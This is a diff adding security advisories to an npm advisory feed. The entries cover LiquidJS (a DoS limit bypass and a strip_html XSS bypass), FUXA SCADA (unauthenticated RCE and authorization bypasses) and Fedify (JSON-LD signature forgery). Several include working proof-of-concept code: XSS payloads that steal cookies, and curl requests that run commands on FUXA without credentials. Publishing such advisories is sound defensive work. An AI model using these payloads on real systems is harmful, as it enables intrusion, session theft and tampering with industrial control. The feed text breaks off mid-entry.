@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-05-26T23:22:57.562Z</updated>
+    <updated>2026-05-27T00:26:14.360Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,420 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[liquidjs] LiquidJS has a renderLimit DoS guard bypass via empty `{% for %}` body]]></title>
+        <id>https://github.com/advisories/GHSA-8xx9-69p8-7jp3</id>
+        <link href="https://github.com/advisories/GHSA-8xx9-69p8-7jp3"/>
+        <updated>2026-05-27T00:11:47.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>renderLimit</code> option — documented in <code>docs/source/tutorials/dos.md</code> as the mechanism that "mitigates this by limiting the time consumed by each render() call" — can be fully bypassed by a <code>{% for %}</code> (or <code>{% tablerow %}</code>) tag whose body is empty. The per-iteration time check is reached only when the body contains at least one template node, so a template like <code>{%- for i in (1..N) -%}{%- endfor -%}</code> iterates the full collection without ever consulting <code>renderLimit</code>. With a configured <code>renderLimit</code> of 50 ms, a single <code>parseAndRenderSync</code> call has been observed to consume <strong>2.26 seconds</strong> (~45× over the limit) and scales linearly with <code>N</code> up to <code>memoryLimit</code>, allowing a low-privileged template author to wedge an event-loop thread for an attacker-chosen duration.</p>
+<h2 id="details">Details</h2>
+<p><code>Render.renderTemplates</code> is the single point at which <code>renderLimit</code> is consulted:</p>
+<pre><code class="language-ts">// src/render/render.ts
+14:  public * renderTemplates (templates: Template[], ctx: Context, emitter?: Emitter): IterableIterator&lt;any&gt; {
+15:    if (!emitter) {
+16:      emitter = ctx.opts.keepOutputType ? new KeepingTypeEmitter() : new SimpleEmitter()
+17:    }
+18:    const errors = []
+19:    for (const tpl of templates) {
+20:      ctx.renderLimit.check(getPerformance().now())
+21:      try {
+22:        const html = yield tpl.render(ctx, emitter)
+...
+32:    }
+</code></pre>
+<p>The check at line 20 lives <strong>inside</strong> the <code>for (const tpl of templates)</code> body. When <code>templates.length === 0</code>, the loop body never executes, so the limiter is never consulted on that invocation.</p>
+<p>The <code>for</code> tag re-enters <code>renderTemplates</code> once per collection item with no independent time check:</p>
+<pre><code class="language-ts">// src/tags/for.ts
+70:    for (const item of collection) {
+71:      scope[this.variable] = item
+72:      ctx.continueCalled = ctx.breakCalled = false
+73:      yield r.renderTemplates(this.templates, ctx, emitter)
+74:      if (ctx.breakCalled) break
+75:      scope.forloop.next()
+76:    }
+</code></pre>
+<p>When <code>{%- for i in (1..N) -%}{%- endfor -%}</code> is parsed, <code>this.templates</code> is <code>[]</code>. Each of the <code>N</code> calls to <code>r.renderTemplates(this.templates, ctx, emitter)</code> therefore performs zero <code>renderLimit.check()</code> calls and zero template work — it just spins the JS-level <code>for</code> loop and the generator boilerplate. With <code>N = 30_000_000</code> this still costs ~2.26 s of CPU, and <code>N = 100_000_000</code> costs ~9.6 s, fully bypassing whatever wall-clock budget the integrator configured.</p>
+<p>The range expression itself is bounded only by <code>memoryLimit</code>:</p>
+<pre><code class="language-ts">// src/render/expression.ts:67-72
+function * evalRangeToken (token: RangeToken, ctx: Context) {
+  const low: number = yield evalToken(token.lhs, ctx)
+  const high: number = yield evalToken(token.rhs, ctx)
+  ctx.memoryLimit.use(high - low + 1)
+  return range(+low, +high + 1)
+}
+</code></pre>
+<p>So the maximum bypass is governed by the (separate) <code>memoryLimit</code>, not by <code>renderLimit</code>. Integrators following the <code>docs/source/tutorials/dos.md</code> guidance — which positions <code>renderLimit</code> as the time-based defense — get no time-based defense at all on this code path.</p>
+<h2 id="poc">PoC</h2>
+<p>Reproduced against <code>liquidjs@10.25.7</code> (HEAD <code>34877950</code>):</p>
+<pre><code class="language-bash"># Empty for-body bypasses renderLimit (50 ms) and runs for ~2.26 s:
+$ node -e "const { Liquid } = require('liquidjs');
+  const engine = new Liquid({ memoryLimit: 1e9, renderLimit: 50 });
+  const t = Date.now();
+  engine.parseAndRenderSync('{%- for i in (1..30000000) -%}{%- endfor -%}', {});
+  console.log('Took', Date.now()-t, 'ms');"
+Took 2255 ms
+
+# Same template with a single-character body is correctly bounded:
+$ node -e "const { Liquid } = require('liquidjs');
+  const engine = new Liquid({ memoryLimit: 1e9, renderLimit: 50 });
+  try { engine.parseAndRenderSync('{%- for i in (1..30000000) -%}.{%- endfor -%}', {}); }
+  catch(e) { console.log('correctly threw:', e.message); }"
+correctly threw: template render limit exceeded, line:1, col:1
+</code></pre>
+<p>Scaling <code>N</code>:</p>
+<ul>
+<li><code>N = 30_000_000</code> → 2255 ms (≈ 45× over the 50 ms limit)</li>
+<li><code>N = 100_000_000</code> → 9581 ms (≈ 191× over the 50 ms limit)</li>
+</ul>
+<p>Time grows linearly with <code>N</code>, capped only by <code>memoryLimit</code> (default <code>Infinity</code>, so the only cap by default is process memory).</p>
+<h2 id="impact">Impact</h2>
+<p>Any liquidjs integrator who follows the upstream DoS guidance and sets a finite <code>renderLimit</code> to bound per-render CPU — typical for SaaS / multi-tenant environments where end users author templates (themes, email templates, snippets) — does not get the bound they configured. A single template submission can keep an event-loop thread busy for seconds, which on a Node.js server is sufficient to stall all in-flight requests on that worker. With a large enough range and a permissive <code>memoryLimit</code>, the wedge time is attacker-controlled. No data is exposed and no integrity is harmed; impact is availability only.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Move the <code>renderLimit</code> check to a location that runs unconditionally per <code>renderTemplates</code> invocation, so a zero-template body still triggers it; alternatively (or additionally) have iteration tags that invoke <code>renderTemplates</code> per element check the limiter themselves once per iteration.</p>
+<pre><code class="language-ts">// src/render/render.ts — check at function entry, before the templates loop
+public * renderTemplates (templates: Template[], ctx: Context, emitter?: Emitter): IterableIterator&lt;any&gt; {
+  if (!emitter) {
+    emitter = ctx.opts.keepOutputType ? new KeepingTypeEmitter() : new SimpleEmitter()
+  }
+  ctx.renderLimit.check(getPerformance().now())   // &lt;-- runs even when templates is empty
+  const errors = []
+  for (const tpl of templates) {
+    ctx.renderLimit.check(getPerformance().now())
+    ...
+  }
+  ...
+}
+</code></pre>
+<p>And/or, defensively, in the iteration tags themselves so the guard cost is paid once per element rather than only at re-entry:</p>
+<pre><code class="language-ts">// src/tags/for.ts (around line 70)
+for (const item of collection) {
+  ctx.renderLimit.check(getPerformance().now())   // &lt;-- per-iteration time check
+  scope[this.variable] = item
+  ctx.continueCalled = ctx.breakCalled = false
+  yield r.renderTemplates(this.templates, ctx, emitter)
+  if (ctx.breakCalled) break
+  scope.forloop.next()
+}
+
+// src/tags/tablerow.ts (around line 54) — analogous addition
+for (let idx = 0; idx &lt; collection.length; idx++, tablerowloop.next()) {
+  ctx.renderLimit.check(getPerformance().now())
+  ...
+}
+</code></pre>
+<p>The same hardening should be applied anywhere a tag drives an attacker-influenced loop count over a (potentially empty) <code>templates</code> array.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/harttle/liquidjs/security/advisories/GHSA-8xx9-69p8-7jp3">https://github.com/harttle/liquidjs/security/advisories/GHSA-8xx9-69p8-7jp3</a></li>
+<li><a href="https://github.com/advisories/GHSA-8xx9-69p8-7jp3">https://github.com/advisories/GHSA-8xx9-69p8-7jp3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8xx9-69p8-7jp3</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-27T00:11:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[liquidjs] LiquidJS's strip_html filter bypass via newline characters in HTML tags enables XSS]]></title>
+        <id>https://github.com/advisories/GHSA-2qv6-9wx5-cwv4</id>
+        <link href="https://github.com/advisories/GHSA-2qv6-9wx5-cwv4"/>
+        <updated>2026-05-27T00:09:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>strip_html</code> filter in liquidjs is intended to remove HTML tags from a string before rendering, and is widely used as an XSS sanitizer. The implementation uses a regex whose catch-all branch (<code>&lt;.*?&gt;</code>) does not match line terminators, so any HTML tag containing a <code>\n</code> or <code>\r</code> character passes through unmodified. An attacker who can place a newline inside a tag (e.g. <code>&lt;img\nsrc=x\nonerror=alert(1)&gt;</code>) bypasses sanitization entirely, since browsers treat newlines as whitespace within a tag and execute the resulting <code>onerror</code>/<code>onload</code>/etc. handler. This results in stored or reflected XSS in any application that relies on <code>strip_html</code> to neutralize untrusted HTML.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerable code is in <code>src/filters/html.ts</code>:</p>
+<pre><code class="language-ts">// src/filters/html.ts:45-49
+export function strip_html (this: FilterImpl, v: string) {
+  const str = stringify(v)
+  this.context.memoryLimit.use(str.length)
+  return str.replace(/&lt;script[\s\S]*?&lt;\/script&gt;|&lt;style[\s\S]*?&lt;\/style&gt;|&lt;.*?&gt;|&lt;!--[\s\S]*?--&gt;/g, '')
+}
+</code></pre>
+<p>The regex has four alternations:</p>
+<ol>
+<li><code>&lt;script[\s\S]*?&lt;\/script&gt;</code> — uses <code>[\s\S]</code>, matches across newlines.</li>
+<li><code>&lt;style[\s\S]*?&lt;\/style&gt;</code> — uses <code>[\s\S]</code>, matches across newlines.</li>
+<li><code>&lt;.*?&gt;</code> — uses <code>.</code>, which in JavaScript does <strong>not</strong> match <code>\n</code> or <code>\r</code> (no <code>s</code>/dotAll flag set).</li>
+<li><code>&lt;!--[\s\S]*?--&gt;</code> — uses <code>[\s\S]</code>, matches across newlines.</li>
+</ol>
+<p>Branch 3 is the catch-all for "any other tag." Because <code>.</code> excludes line terminators, a tag containing a newline does not match any alternative. The literal characters of the tag are passed through to the output.</p>
+<p>Browsers, however, parse HTML tag content with whitespace tolerance: per the HTML spec, attribute names and values may be separated by ASCII whitespace, which includes <code>\n</code> and <code>\r</code>. So <code>&lt;img\nsrc=x\nonerror=alert(1)&gt;</code> is parsed as a valid <code>img</code> element with an <code>onerror</code> handler.</p>
+<p><code>liquidjs</code>' default rendering pipeline does not auto-escape filter output (the <code>outputEscape</code> engine option is undefined by default — see <code>src/liquid-options.ts</code>), so the unescaped HTML is delivered verbatim to the consumer's HTML response.</p>
+<p>Trust path:</p>
+<ul>
+<li>Application receives untrusted input (e.g. user comment field).</li>
+<li>Developer renders it as <code>{{ comment | strip_html }}</code> to "safely" embed user content as plaintext.</li>
+<li>Attacker submits <code>&lt;img\u000Asrc=x\u000Aonerror=alert(document.cookie)&gt;</code>.</li>
+<li><code>strip_html</code> returns the input unchanged.</li>
+<li>Output is written into the HTML response with no further escaping.</li>
+<li>Victim's browser executes the attacker's JavaScript in the application's origin.</li>
+</ul>
+<p>This is an inconsistency bug: the same regex correctly uses <code>[\s\S]</code> for <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code>, and comment branches, but reverts to <code>.</code> for the catch-all. The other branches' authors clearly knew to handle multi-line content; the catch-all was missed.</p>
+<h2 id="poc">PoC</h2>
+<p>Reproduces against current HEAD (10.25.7) using the published <code>dist/liquid.node.js</code> build:</p>
+<pre><code class="language-bash">node -e "
+const { Liquid } = require('./dist/liquid.node.js');
+const engine = new Liquid();
+engine.parseAndRender(
+  'Safe output: {{ input | strip_html }}',
+  { input: '&lt;img\nsrc=x\nonerror=\"alert(document.cookie)\"&gt;' }
+).then(r =&gt; console.log(JSON.stringify(r)));
+"
+</code></pre>
+<p>Verified output:</p>
+<pre><code>"Safe output: &lt;img\nsrc=x\nonerror=\"alert(document.cookie)\"&gt;"
+</code></pre>
+<p>The <code>&lt;img ... onerror=...&gt;</code> tag is delivered to the output completely unmodified. When this string is placed into an HTML document and parsed by a browser, the <code>onerror</code> handler executes.</p>
+<p>Same bypass works with <code>\r</code> (carriage return), <code>\r\n</code>, or any combination of CR/LF inside the tag. It also works with other event-handler vectors (<code>&lt;svg\nonload=alert(1)&gt;</code>, <code>&lt;body\nonload=alert(1)&gt;</code>, <code>&lt;iframe\nsrc="javascript:alert(1)"&gt;</code>, etc.) and is not specific to <code>&lt;img&gt;</code>.</p>
+<p>For comparison, the same input without a newline is correctly stripped:</p>
+<pre><code class="language-bash">node -e "
+const { Liquid } = require('./dist/liquid.node.js');
+const engine = new Liquid();
+engine.parseAndRender(
+  'Safe output: {{ input | strip_html }}',
+  { input: '&lt;img src=x onerror=\"alert(1)\"&gt;' }
+).then(r =&gt; console.log(JSON.stringify(r)));
+"
+# → "Safe output: "
+</code></pre>
+<p>This confirms <code>strip_html</code> is intended to remove tags of this shape, and the newline form is a sanitizer bypass rather than expected behavior.</p>
+<h2 id="impact">Impact</h2>
+<p>Any liquidjs-using application that:</p>
+<ol>
+<li>Renders attacker-controlled strings via <code>{{ x | strip_html }}</code> to defend against HTML injection, AND</li>
+<li>Does not separately HTML-escape that output (default behavior — <code>outputEscape</code> is unset by default),</li>
+</ol>
+<p>Is vulnerable to stored or reflected XSS. The attacker can execute arbitrary JavaScript in the victim's browser in the application's origin, enabling session theft, account takeover, CSRF with origin-scoped credentials, and arbitrary actions in the victim's authenticated session. The XSS is triggered with simple, well-known event-handler payloads — no exotic encoding, no character set tricks, just a literal newline inside the tag.</p>
+<p>The blast radius matches the deployment of liquidjs as a server-side template engine: liquidjs is one of the most popular Liquid implementations on npm (millions of downloads/week) and <code>strip_html</code> is documented as the sanitization filter for HTML stripping, so the vulnerable pattern (<code>{{ user | strip_html }}</code>) is the natural and recommended use of the filter.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Replace <code>&lt;.*?&gt;</code> with <code>&lt;[\s\S]*?&gt;</code> (or apply the <code>s</code>/dotAll flag to the entire regex) so the catch-all branch matches across line terminators, consistent with the other branches:</p>
+<pre><code class="language-ts">// src/filters/html.ts
+export function strip_html (this: FilterImpl, v: string) {
+  const str = stringify(v)
+  this.context.memoryLimit.use(str.length)
+  return str.replace(/&lt;script[\s\S]*?&lt;\/script&gt;|&lt;style[\s\S]*?&lt;\/style&gt;|&lt;[\s\S]*?&gt;|&lt;!--[\s\S]*?--&gt;/g, '')
+}
+</code></pre>
+<p>Equivalent fix using the dotAll flag (requires ES2018+, which liquidjs already targets):</p>
+<pre><code class="language-ts">return str.replace(/&lt;script.*?&lt;\/script&gt;|&lt;style.*?&lt;\/style&gt;|&lt;.*?&gt;|&lt;!--.*?--&gt;/gs, '')
+</code></pre>
+<p>After the fix, the PoC input is correctly reduced to an empty string. Note that <code>strip_html</code> should still not be relied on as a primary XSS defense — the project README/documentation should recommend HTML-escaping (<code>escape</code> filter) for untrusted content rendered into HTML contexts. A brief security note in the filter's documentation would help users who currently treat <code>strip_html</code> as a sanitizer.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/harttle/liquidjs/security/advisories/GHSA-2qv6-9wx5-cwv4">https://github.com/harttle/liquidjs/security/advisories/GHSA-2qv6-9wx5-cwv4</a></li>
+<li><a href="https://github.com/advisories/GHSA-2qv6-9wx5-cwv4">https://github.com/advisories/GHSA-2qv6-9wx5-cwv4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2qv6-9wx5-cwv4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-27T00:09:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[fuxa-server] FUXA Vulnerable to Unauthenticated Remote Code Execution via Script Test Mode Authorization Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-rg3m-cfq7-g6h6</id>
+        <link href="https://github.com/advisories/GHSA-rg3m-cfq7-g6h6"/>
+        <updated>2026-05-26T23:44:55.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An unauthenticated Remote Code Execution vulnerability exists in FUXA when <code>secureEnabled</code> is set to <code>true</code>. The <code>POST /api/runscript</code> endpoint checks authorization against the stored script's permission by ID, but when <code>test: true</code> is set in the request, it compiles and executes attacker-supplied code instead of the stored script's code. An unauthenticated attacker who knows a valid script ID and name may execute arbitrary code via test mode if at least one server-side script exists and is accessible without restrictive permissions.</p>
+<p>Script IDs and names can be obtained through the unauthenticated information disclosure in <code>GET /api/project</code> (reported separately).</p>
+<p>The only prerequisite is that at least one server-side script exists in the project.</p>
+<h3 id="details">Details</h3>
+<p><strong>Authorization confused deputy in script execution</strong></p>
+<p>File: <code>server/runtime/scripts/index.js</code>, lines 86-103</p>
+<p>The authorization check looks up the stored script by ID and validates the stored script's <code>permission</code> field:</p>
+<pre><code class="language-javascript">this.isAuthorised = function (_script, permission) {
+    const st = scriptModule.getScript(_script);  // finds stored script by _script.id
+    if (admin || (st &amp;&amp; (!st.permission || st.permission &amp; permission))) {
+        return true;
+    }
+    return false;
+}
+</code></pre>
+<p>When a script has no <code>permission</code> field set (or <code>permission: 0</code>), the expression <code>!st.permission</code> evaluates to <code>true</code>, and the check passes for any caller including guests.</p>
+<p><strong>Guest auto-authentication in the middleware</strong></p>
+<p>File: <code>server/api/jwt-helper.js</code>, lines 46-72</p>
+<p>The <code>verifyToken</code> middleware generates a valid guest JWT when no token is provided:</p>
+<pre><code class="language-javascript">if (!token) {
+    token = getGuestToken();
+}
+</code></pre>
+<p>The guest token passes verification. The request proceeds to the handler with <code>userId: "guest"</code>. The <code>isAuthorised</code> check then finds the stored script and validates against its permission. Scripts without a <code>permission</code> field pass for any user including guests.</p>
+<p><strong>Test mode executes attacker-supplied code</strong></p>
+<p>File: <code>server/runtime/scripts/msm.js</code></p>
+<p>When <code>test: true</code> is set, <code>runTestScript</code> takes the attacker's <code>code</code> field from the request body, compiles it into a Node.js module via <code>Module._compile</code>, and executes it with full access to <code>require</code>, <code>child_process</code>, <code>fs</code>, and the entire Node.js runtime. The authorization checked the stored script's permission. The execution runs the attacker's code.</p>
+<h3 id="poc">PoC</h3>
+<p>Requires an existing server-side script accessible without restrictive permissions.</p>
+<p><strong>Step 1: Retrieve script IDs from the unauthenticated project endpoint</strong></p>
+<pre><code class="language-bash">curl -s http://192.168.32.129:1881/api/project | jq '.scripts[] | {id, name, permission}'
+</code></pre>
+<pre><code class="language-json">{
+  "id": "legit-001",
+  "name": "calculate",
+}
+{
+  "id": "s_42a888fa-8e3d4213",
+  "name": "subs",
+}
+</code></pre>
+<p><strong>Step 2: Execute <code>whoami</code> without authentication</strong></p>
+<p>Using the script ID and name from step 1:</p>
+<pre><code class="language-bash">curl -s -X POST http://192.168.32.129:1881/api/runscript \
+  -H "Content-Type: application/json" \
+  -d '{"params":{"script":{"id":"s_42a888fa-8e3d4213","name":"subs","test":true,"code":"return require(\"child_process\").execSync(\"whoami\").toString()","parameters":[],"sync":true}}}'
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Any network-reachable attacker can achieve Remote Code Execution on the FUXA server without any credentials. The attacker needs a valid script ID and name (obtainable through the separately reported information disclosure) and one server-side script to exist in the project.</p>
+<p>Potential impact includes arbitrary command execution on the host, access to configured device connections and credentials, and compromise of industrial control functionality managed by the FUXA instance.</p>
+<p>This issue depends on the presence of an existing server-side script with no restrictive permissions configured. It does not affect configurations without server-side scripts or where script permissions prevent guest access.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/frangoteam/FUXA/security/advisories/GHSA-rg3m-cfq7-g6h6">https://github.com/frangoteam/FUXA/security/advisories/GHSA-rg3m-cfq7-g6h6</a></li>
+<li><a href="https://github.com/frangoteam/FUXA/pull/2260">https://github.com/frangoteam/FUXA/pull/2260</a></li>
+<li><a href="https://github.com/frangoteam/FUXA/commit/78534da61a91613712b44bb63c8d7da8c5df5ca4">https://github.com/frangoteam/FUXA/commit/78534da61a91613712b44bb63c8d7da8c5df5ca4</a></li>
+<li><a href="https://github.com/frangoteam/FUXA/releases/tag/v1.3.1">https://github.com/frangoteam/FUXA/releases/tag/v1.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-rg3m-cfq7-g6h6">https://github.com/advisories/GHSA-rg3m-cfq7-g6h6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rg3m-cfq7-g6h6</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-26T23:44:52.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[fuxa-server] FUXA has an unauthenticated arbitrary tag value disclosure via /api/getTagValue]]></title>
+        <id>https://github.com/advisories/GHSA-fwcm-rqvw-j3p7</id>
+        <link href="https://github.com/advisories/GHSA-fwcm-rqvw-j3p7"/>
+        <updated>2026-05-26T23:41:46.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p> An authorization bypass in the /api/getTagValue endpoint allows unauthenticated access to tag values when the referenced script does not exist.</p>
+<h3 id="details">Details</h3>
+<p>  The issue is caused by the combination of these code paths:</p>
+<ul>
+<li><code>server/api/apikeys/verify-api-or-token.js:45</code> sends requests without <code>x-api-key</code> to <code>authJwt.verifyToken(req, res, next)</code>.</li>
+<li><code>server/api/jwt-helper.js:46-64</code> creates a signed guest token when no <code>x-access-token</code> is provided:
+<code>if (!token) { token = getGuestToken(); }</code>
+and then populates <code>req.userId</code> / <code>req.userGroups</code> from that guest token.</li>
+<li><code>server/api/command/index.js:76-105</code> exposes <code>/api/getTagValue</code>.</li>
+<li><code>server/runtime/scripts/index.js:106-111</code> returns <code>true</code> when the referenced script does not exist:
+<code>if (!script) { return true; }</code></li>
+</ul>
+<p>  As a result, an unauthenticated request reaches <code>/api/getTagValue</code> as <code>guest</code>, and the authorization check is bypassed because <code>isAuthorisedByScriptName()</code> returns <code>true</code> when <code>sourceScriptName</code> is omitted or does not match a real script. The endpoint then returns arbitrary tag values by ID.</p>
+<h3 id="poc">PoC</h3>
+<p>Requests to /api/getTagValue without authentication could succeed when the authorization logic evaluated a non-existent sourceScriptName as authorized.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/frangoteam/FUXA/security/advisories/GHSA-fwcm-rqvw-j3p7">https://github.com/frangoteam/FUXA/security/advisories/GHSA-fwcm-rqvw-j3p7</a></li>
+<li><a href="https://github.com/frangoteam/FUXA/pull/2260">https://github.com/frangoteam/FUXA/pull/2260</a></li>
+<li><a href="https://github.com/frangoteam/FUXA/commit/78534da61a91613712b44bb63c8d7da8c5df5ca4">https://github.com/frangoteam/FUXA/commit/78534da61a91613712b44bb63c8d7da8c5df5ca4</a></li>
+<li><a href="https://github.com/frangoteam/FUXA/releases/tag/v1.3.1">https://github.com/frangoteam/FUXA/releases/tag/v1.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-fwcm-rqvw-j3p7">https://github.com/advisories/GHSA-fwcm-rqvw-j3p7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fwcm-rqvw-j3p7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-26T23:41:45.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@frangoteam/fuxa] FUXA Vulnerable to Pre-auth RCE via Path Manipulation & Configuration Injection]]></title>
+        <id>https://github.com/advisories/GHSA-p69w-mmfv-xrfj</id>
+        <link href="https://github.com/advisories/GHSA-p69w-mmfv-xrfj"/>
+        <updated>2026-05-26T23:40:44.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>Pre-auth</strong> RCE in FUXA via Logic Bypass</p>
+<p>Summary</p>
+<p>A Critical vulnerability chain exists in FUXA (v.1.3.0-2706) that allows an unauthenticated remote attacker to achieve Full Remote Code Execution (RCE) as root. The exploit succeeds even when the platform is configured in its most secure state (Secure Mode Enabled and Node-RED Secure Auth Enabled).</p>
+<p>Details
+The vulnerability is a Path Confusion flaw in the authentication middleware. The server uses a substring match on the full URL (including query parameters) to exclude certain paths from authentication.</p>
+<p>Involved Logic:</p>
+<p>JavaScript:</p>
+<pre><code>const url = req.originalUrl || req.url || req.path;
+if (url.includes('/socket.io')) return next();
+By appending ?x=/socket.io to any administrative request, the middleware is "tricked" into treating the request as a public WebSocket handshake, bypassing the secureEnabled and nodeRedAuthMode checks entirely.
+</code></pre>
+<p>Proof of Concept</p>
+<p>A specially crafted request containing manipulated query parameters could bypass authentication checks on protected /nodered/* endpoints.</p>
+<p>In configurations where Node-RED exposed privileged or command-execution capable nodes, this could lead to remote code execution within the container context.</p>
+<p>Impact
+Access Level: Unauthenticated / Remote.</p>
+<p>Privilege Level: Access to Node-RED administrative endpoints. 
+Remote code execution may be possible depending on the Node-RED configuration and installed nodes.</p>
+<p>CVSS 3.1 Score: High severity.</p>
+<p>Description: An attacker can gain total control over the SCADA server, allowing them to intercept industrial data (MQTT/OPC-UA), manipulate PLC tags, or pivot into the internal OT network.</p>
+<p>Root Cause &amp; Remediation
+The root cause is the reliance on req.originalUrl for security-critical routing decisions.</p>
+<p>The Fix:
+The developer must use req.path (which Express pre-parses to remove query strings) or a formal URL parser to ensure that the security check is performed only against the pathname.</p>
+<pre><code>JavaScript
+
+// Secure approach
+const pathname = req.path; 
+if (pathname.startsWith('/socket.io/')) return next();
+</code></pre>
+<p>This issue affects only setups where Node-RED is enabled.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/frangoteam/FUXA/security/advisories/GHSA-p69w-mmfv-xrfj">https://github.com/frangoteam/FUXA/security/advisories/GHSA-p69w-mmfv-xrfj</a></li>
+<li><a href="https://github.com/frangoteam/FUXA/releases/tag/v1.3.1">https://github.com/frangoteam/FUXA/releases/tag/v1.3.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-p69w-mmfv-xrfj">https://github.com/advisories/GHSA-p69w-mmfv-xrfj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-p69w-mmfv-xrfj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-26T23:40:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@fedify/fedify] Fedify has an LD-Signature Bypass via JSON-LD Named-Graph Restructuring]]></title>
+        <id>https://github.com/advisories/GHSA-9rfg-v8g9-9367</id>
+        <link href="https://github.com/advisories/GHSA-9rfg-v8g9-9367"/>
+        <updated>2026-05-26T23:38:39.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An attacker can make use of JSON-LD features to restructure a JSON-LD document that would change how Fedify interprets it without changing its Linked Data Signature, allowing them to alter a third-party signed activity they have received.</p>
+<h3 id="details">Details</h3>
+<p>The vulnerability essentially boils down to the signature being on the canonical RDF graph representation of the JSON-LD document, and JSON-LD offering many ways to represent the same graph.</p>
+<p>One of the issues is that by taking a signed <code>Activity</code> with an embedded <code>object</code>, an attacker can move the top-level <code>Activity</code> to a <code>@graph</code> property and move the activity's <code>object</code> to the top-level. Such a transformation preserves the signature and changes how the payload is interpreted by pretty much all ActivityPub implementations, making them process the object and ignore the formely-top-level activity. This can be used when the graph contains an embedded activity. In Mastodon, that is the case of <code>{ "type": "Undo", "object": { "type": "Announce" } }</code>, but other implementations may sign other activities that can be exploited in the same way.</p>
+<p>The <code>@reverse</code> keyword can also be used to change the shape of a JSON-LD document without changing the underlying graph, and could be used in a similar way to reverse an <code>Activity</code> and its <code>object</code>.</p>
+<p>Another problematic feature is <code>@included</code>, which can be used to “move” properties outside of the normal tree, effectively making them invisible to most ActivityPub implementations, while, again, preserving the signature. This allows removing statuses or actor properties once a signed <code>Create</code> or <code>Update</code> activity is received.</p>
+<p>Given that Fedify have seen no use of <code>@graph</code>, <code>@included</code> or <code>@reverse</code> in ActivityPub payloads and that they are very complex to handle correctly (the only JSON-LD API functions that “normalize” <code>@included</code> and <code>@reverse</code> are flattening and framing, which both lose the root node), a decision to reject them has been made, and it is recommended for users do so as well.</p>
+<p>Detection of <code>@graph</code>, <code>@included</code> and <code>@reverse</code> should happen after compacting the incoming activity to an application's context, as aliases can be used for those keywords.</p>
+<p>Additionally, after a quick scan of Fedify's source code, I could not verify that JSON-LD documents with a verified Linked Data Signature were compacted against an application's local JSON-LD context. Not doing that allows an attacker to rename aliases to non-standard names and use non-mapped aliases to replace existing values, while still leaving the signature intact. This allows an attacker to essentially replace arbitrary portions of any signed JSON-LD document and completely forge any activity while still passing verification. A similar issue was fixed in Mastodon a few years ago: <a href="https://github.com/mastodon/mastodon/pull/17426">https://github.com/mastodon/mastodon/pull/17426</a>.</p>
+<h3 id="impact">Impact</h3>
+<p>The impact is difficult to assess as this depends on the types of activities that are actually signed and processed in the wild.</p>
+<p>The <code>@included</code> keyword allows “removing” arbitrary attributes, thus allowing replaying <code>Create</code> and <code>Update</code> activities while stripping away any attribute, such as content or metadata, which can lead to integrity and availability issues, although confidentiality issues are unlikely.</p>
+<p>The <code>@graph</code> and <code>@reverse</code> keywords allow changing the root activity, which in the case of Mastodon allows sending an <code>Announce</code> from a <code>Undo { Announce }</code>, but might have wider consequences depending on what various servers sign.</p>
+<p>The lack of compacting can allow rewriting any activity arbitrarily, thus leading to major integrity, availability, and possibly confidentiality issues (e.g. by replacing an actor's <code>inbox</code>).</p>
+<h3 id="references">References</h3>
+<ul>
